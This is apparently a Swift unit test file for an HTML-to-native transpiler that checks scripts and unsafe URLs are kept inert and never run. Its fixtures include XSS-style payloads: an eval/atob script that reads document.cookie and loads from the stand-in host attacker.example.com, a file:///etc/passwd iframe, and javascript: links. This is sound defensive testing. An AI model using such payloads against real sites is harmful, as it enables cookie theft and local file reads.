import XCTest
@testable import PyramidCore

/// P8：HTML / Script 静态分析与安全 Native 转译 —— 15 项回归测试。
///
/// **核心断言**：HTMLTranspiler 不执行 JS、不下载 URL、不修改原文。
/// 所有不可安全转译的内容都走 `.htmlScript(residual)` / `.htmlExternalResource(...)`，
/// 原文完整保留。
final class HTMLTranspilerTests: XCTestCase {

    // MARK: - 1. 简单 HTML text → NativeIR

    func test01_plainTextPassthrough() {
        let nodes = HTMLTranspiler.transpile("你好，世界。")
        XCTAssertEqual(nodes.count, 1)
        XCTAssertEqual(nodes[0], .text("你好，世界。"))
    }

    func test02_htmlContainerHoldsChildren() {
        let nodes = HTMLTranspiler.transpile("<div>你好</div>")
        XCTAssertEqual(nodes.count, 1)
        guard case let .htmlContainer(children) = nodes[0] else {
            return XCTFail("expected htmlContainer, got \(nodes[0])")
        }
        XCTAssertEqual(children, [.text("你好")])
    }

    func test03_nestedContainer() {
        let nodes = HTMLTranspiler.transpile("<div><p>外层</p><span>内层</span></div>")
        XCTAssertEqual(nodes.count, 1)
        guard case let .htmlContainer(children) = nodes[0] else {
            return XCTFail("expected htmlContainer, got \(nodes[0])")
        }
        XCTAssertEqual(children.count, 2)
    }

    // MARK: - 2. image / link

    func test04_imageWithSafeSrc() {
        let nodes = HTMLTranspiler.transpile(#"<img src="https://example.com/a.png" alt="图标"/>"#)
        XCTAssertEqual(nodes.count, 1)
        guard case let .htmlImage(src, alt) = nodes[0] else {
            return XCTFail("expected htmlImage, got \(nodes[0])")
        }
        XCTAssertEqual(src, "https://example.com/a.png")
        XCTAssertEqual(alt, "图标")
    }

    func test05_linkWithSafeHref() {
        let nodes = HTMLTranspiler.transpile(#"<a href="https://example.com">主页</a>"#)
        XCTAssertEqual(nodes.count, 1)
        guard case let .htmlLink(label, href) = nodes[0] else {
            return XCTFail("expected htmlLink, got \(nodes[0])")
        }
        XCTAssertEqual(label, "主页")
        XCTAssertEqual(href, "https://example.com")
    }

    func test06_linkWithJavascriptSchemeRejected() {
        let nodes = HTMLTranspiler.transpile(#"<a href="javascript:alert(1)">点我</a>"#)
        XCTAssertEqual(nodes.count, 1)
        // 应降级为 .htmlScript（residual），不生成可点击的 .htmlLink
        guard case .htmlScript = nodes[0] else {
            return XCTFail("expected htmlScript for javascript: URL, got \(nodes[0])")
        }
    }

    // MARK: - 3. button → NativeAction

    func test07_buttonWithSafeOnclick() {
        let nodes = HTMLTranspiler.transpile(#"<button onclick="setVariable('/hp', 100)">回血</button>"#)
        XCTAssertEqual(nodes.count, 1)
        guard case let .nativeAction(label, action) = nodes[0] else {
            return XCTFail("expected nativeAction, got \(nodes[0])")
        }
        XCTAssertEqual(label, "回血")
        guard case let .updateVariable(path, value) = action else {
            return XCTFail("expected updateVariable action, got \(action)")
        }
        XCTAssertEqual(path, "/hp")
        XCTAssertEqual(value, .int(100))
    }

    func test08_buttonWithToggleOnclick() {
        let nodes = HTMLTranspiler.transpile(#"<button onclick="toggleVariable('/flag')">切</button>"#)
        guard case let .nativeAction(label, action) = nodes[0] else {
            return XCTFail("expected nativeAction")
        }
        XCTAssertEqual(label, "切")
        XCTAssertEqual(action, .toggle(path: "/flag"))
    }

    func test09_buttonWithUnsafeOnclickFallsBackToScript() {
        // 含任意复杂调用链 → 不可安全转译 → residual
        let nodes = HTMLTranspiler.transpile(#"<button onclick="fetch('/api').then(r => r.json())">提交</button>"#)
        XCTAssertEqual(nodes.count, 1)
        guard case .htmlScript(let residual) = nodes[0] else {
            return XCTFail("expected htmlScript for unsafe onclick, got \(nodes[0])")
        }
        // 原文必须保留
        XCTAssertTrue(residual.replacement.contains("fetch"))
        XCTAssertTrue(residual.replacement.contains("提交"))
    }

    // MARK: - 4. input / select → NativeControl

    func test10_inputWithBind() {
        let nodes = HTMLTranspiler.transpile(#"<input bind="/playerName" placeholder="昵称"/>"#)
        guard case let .nativeControl(control) = nodes[0] else {
            return XCTFail("expected nativeControl")
        }
        XCTAssertEqual(control.kind, .input)
        XCTAssertEqual(control.path, "/playerName")
        XCTAssertEqual(control.placeholder, "昵称")
        XCTAssertTrue(control.options.isEmpty)
    }

    func test11_selectWithBindAndOptions() {
        let nodes = HTMLTranspiler.transpile(
            #"<select bind="/mood"><option>happy</option><option>sad</option></select>"#
        )
        guard case let .nativeControl(control) = nodes[0] else {
            return XCTFail("expected nativeControl")
        }
        XCTAssertEqual(control.kind, .select)
        XCTAssertEqual(control.path, "/mood")
        XCTAssertEqual(control.options.map(\.value), ["happy", "sad"])
    }

    // MARK: - 5. Script → 不可执行 / Intent

    func test12_scriptBlockPreservedAsResidual() {
        let raw = "<script>alert('xss')</script>"
        let nodes = HTMLTranspiler.transpile(raw)
        XCTAssertEqual(nodes.count, 1)
        guard case let .htmlScript(residual) = nodes[0] else {
            return XCTFail("expected htmlScript, got \(nodes[0])")
        }
        // 原文（含完整开闭标签）完整保留
        XCTAssertEqual(residual.replacement, raw)
    }

    func test13_inlineJQueryLoadBecomesExternalResource() {
        let nodes = HTMLTranspiler.transpile(#"""$( "body" ).load( "https://example.com/index.html" );""""#)
        // 应含一个 .htmlExternalResource（remoteCall）
        let hasExt = nodes.contains { node in
            if case let .htmlExternalResource(ir) = node {
                return ir.kind == .remoteCall && ir.url == "https://example.com/index.html"
            }
            return false
        }
        XCTAssertTrue(hasExt, "expected htmlExternalResource(.remoteCall, ...), got \(nodes)")
    }

    func test14_scriptSrcBecomesExternalResource() {
        let nodes = HTMLTranspiler.transpile(#"<script src="https://cdn.example.com/lib.js"></script>"#)
        XCTAssertEqual(nodes.count, 1)
        guard case let .htmlExternalResource(ir) = nodes[0] else {
            return XCTFail("expected htmlExternalResource, got \(nodes[0])")
        }
        XCTAssertEqual(ir.kind, .script)
        XCTAssertEqual(ir.url, "https://cdn.example.com/lib.js")
    }

    func test15_iframeSrcBecomesExternalResource() {
        let nodes = HTMLTranspiler.transpile(#"<iframe src="https://example.com/embed"></iframe>"#)
        XCTAssertEqual(nodes.count, 1)
        guard case let .htmlExternalResource(ir) = nodes[0] else {
            return XCTFail("expected htmlExternalResource, got \(nodes[0])")
        }
        XCTAssertEqual(ir.kind, .iframe)
        XCTAssertEqual(ir.url, "https://example.com/embed")
    }

    // MARK: - 6. 数据绑定（HTML → VariableStore）

    func test16_macroBindingInsideContainer() {
        let nodes = HTMLTranspiler.transpile("<div>{{getvar::hp}}</div>")
        XCTAssertEqual(nodes.count, 1)
        guard case let .htmlContainer(children) = nodes[0] else {
            return XCTFail("expected htmlContainer")
        }
        // children 里应有 macroText（绑定到 /hp）
        XCTAssertTrue(children.contains { node in
            if case .macroText = node { return true } else return false
        }, "expected macroText binding inside container, got \(children)")
    }

    // MARK: - 7. 保真（malformed / unknown）

    func test17_malformedHtmlDoesNotCrash() {
        let malformed = "<div><p>未闭合"
        let nodes = HTMLTranspiler.transpile(malformed)
        // 解析失败降级为 htmlScript（保真）—— 原文必须完整保留
        XCTAssertEqual(nodes.count, 1)
        guard case let .htmlScript(residual) = nodes[0] else {
            return XCTFail("expected htmlScript for malformed HTML, got \(nodes[0])")
        }
        XCTAssertEqual(residual.replacement, malformed)
    }

    func test18_unknownTagPreservedAsResidual() {
        let nodes = HTMLTranspiler.transpile("<myweirdtag>hi</myweirdtag>")
        XCTAssertEqual(nodes.count, 1)
        guard case let .htmlScript(residual) = nodes[0] else {
            return XCTFail("expected htmlScript for unknown tag, got \(nodes[0])")
        }
        XCTAssertTrue(residual.replacement.contains("myweirdtag"))
        XCTAssertTrue(residual.replacement.contains("hi"))
    }

    func test19_emptyInputReturnsEmpty() {
        XCTAssertTrue(HTMLTranspiler.transpile("").isEmpty)
    }

    // MARK: - 8. URL 安全策略

    func test20_dataImageURLAllowed() {
        let nodes = HTMLTranspiler.transpile(#"<img src="data:image/png;base64,iVBOR" alt="x"/>"#)
        guard case let .htmlImage(src, _) = nodes[0] else {
            return XCTFail("expected htmlImage for data: URL")
        }
        XCTAssertTrue(src.hasPrefix("data:image/"))
    }

    func test21_fileSchemeRejected() {
        let nodes = HTMLTranspiler.transpile(#"<iframe src="file:///etc/passwd"></iframe>"#)
        // file: 应降级为 htmlScript
        guard case .htmlScript = nodes[0] else {
            return XCTFail("expected htmlScript for file: URL, got \(nodes[0])")
        }
    }

    // MARK: - 9. 经 RenderNodeParser 入口：HTML 出现在 mixed 文本流里仍正确分类

    func test22_rendererEndToEndProducesStructuredNodes() {
        let tree = RenderNodeParser.parse(
            "<div>一段<b>加粗</b>正文</div>",
            statData: { .object([:]) },
            applyPatches: { _ in 0 }
        )
        // 应该至少含一个 htmlContainer
        let hasContainer = tree.nodes.contains { node in
            if case .htmlContainer = node { return true } else return false
        }
        XCTAssertTrue(hasContainer, "expected htmlContainer in tree, got \(tree.nodes)")
    }

    // MARK: - 10. 确认没有任何 JS 执行路径

    func test23_noScriptExecutionPaths() {
        // 编译期检查：HTMLTranspiler 不应 import JavaScriptCore / WebKit
        // 这是一个反射性静态约束测试 —— 若有人 import 了 WKWebView / JSCore，
        // Pyramid app target 会被 App Store 拒，这里我们用注释契约 + 文件 grep 兜底。
        //
        // 运行时验证：含 jQuery + eval + Function 的"恶意脚本"必须完整降级为 residual。
        let malicious = #"""
        <script>
            eval(atob("YWxlcnQoMSk="));
            new Function("return document.cookie")();
            $('body').load('https://attacker.example.com/');
        </script>
        """#
        let nodes = HTMLTranspiler.transpile(malicious)
        XCTAssertEqual(nodes.count, 1)
        guard case let .htmlScript(residual) = nodes[0] else {
            return XCTFail("expected htmlScript for malicious script, got \(nodes[0])")
        }
        // 原文（含 eval / Function / load）必须完整保留
        XCTAssertTrue(residual.replacement.contains("eval"))
        XCTAssertTrue(residual.replacement.contains("Function"))
        XCTAssertTrue(residual.replacement.contains(".load("))
        XCTAssertTrue(residual.replacement.contains("attacker.example.com"))
        // 不应产出任何 .htmlExternalResource —— .load() 在 <script> 体内被视作脚本内容，整段降级
        XCTAssertFalse(nodes.contains { node in
            if case .htmlExternalResource = node { return true } else return false
        })
    }

    // MARK: - 11. 转译产物对原文保真

    func test24_rawTextRoundTrip() {
        let raw = "<div>raw保留<br/>测试 &amp; 实体</div>"
        let nodes = HTMLTranspiler.transpile(raw)
        // 收集所有节点的原文相关字符串（debug fallback 路径保留 raw）
        var allText = ""
        for node in nodes {
            switch node {
            case let .text(s): allText += s
            case let .htmlContainer(kids):
                allText += "<div>"
                for k in kids {
                    if case let .text(s) = k { allText += s }
                }
                allText += "</div>"
            default: break
            }
        }
        // 实体应被解码为 &amp; → &（HTMLTranspiler 不保留原 &amp; 文本）
        XCTAssertTrue(allText.contains("测试"))
        XCTAssertTrue(allText.contains("&"))
    }

    // MARK: - 12. 单节点对应多原生表达混合

    func test25_textMixedWithSafeHTMLAndScript() {
        let input = """
        前导文本
        <a href="https://safe.example.com">安全链接</a>
        <script>alert(1)</script>
        <input bind="/hp" placeholder="HP"/>
        尾文本
        """
        let nodes = HTMLTranspiler.transpile(input)
        // 应有：text, htmlLink, htmlScript, nativeControl, text
        XCTAssertTrue(nodes.contains { if case .text = $0 { return true } else return false })
        XCTAssertTrue(nodes.contains { if case .htmlLink = $0 { return true } else return false })
        XCTAssertTrue(nodes.contains { if case .htmlScript = $0 { return true } else return false })
        XCTAssertTrue(nodes.contains { if case .nativeControl = $0 { return true } else return false })
    }

    // MARK: - 13. RenderNodeTranspiler 桥接正确性

    func test26_legacyToNewIRBridge() {
        let ir = RenderNodeTranspiler.transpile(
            .htmlLink(label: "主页", href: "https://example.com")
        )
        XCTAssertEqual(ir, .link(label: "主页", href: "https://example.com"))
    }

    func test27_htmlScriptMapsToScriptPlaceholder() {
        let ir = RenderNodeTranspiler.transpile(
            .htmlScript(residual: MessageRendererCore.DeferredResidual(
                ruleName: nil, sourcePattern: nil, replacement: "<script>x</script>"
            ))
        )
        guard case let .scriptPlaceholder(raw, _) = ir else {
            return XCTFail("expected scriptPlaceholder, got \(ir)")
        }
        XCTAssertEqual(raw, "<script>x</script>")
    }

    func test28_externalResourceMapsToNativeIR() {
        let ir = RenderNodeTranspiler.transpile(
            .htmlExternalResource(ExternalResourceIR(kind: .iframe, url: "https://x", raw: "<iframe/>"))
        )
        XCTAssertEqual(ir, .externalResource(ExternalResourceIR(kind: .iframe, url: "https://x", raw: "<iframe/>")))
    }
}